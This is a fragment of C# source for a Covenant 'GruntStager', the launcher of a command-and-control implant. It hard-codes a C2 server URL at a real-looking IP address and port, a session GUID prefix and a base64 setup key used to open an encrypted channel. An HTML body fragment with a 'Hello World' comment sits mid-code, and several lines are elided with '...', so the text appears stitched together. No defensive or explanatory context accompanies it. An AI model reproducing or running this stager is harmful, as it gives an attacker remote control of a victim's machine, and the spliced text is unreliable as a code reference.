...
namespace GruntStager
{
    public class GruntStager
    {
        ...
        public void ExecuteStager()
        {
            try
            {
                List<string> CovenantURIs = @"http://158.179.209.175:40000".Split(',').ToList();
    ...
    <body>
        ...
        // Hello World! {0}
                ...
                string aGUID = @"c09e46db4b";
                string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] SetupKeyBytes = Convert.FromBase64String(@"b9KaEKjo8apI54CE2D+fwIoTAzUf5Q0pIhZftv20PbA=");
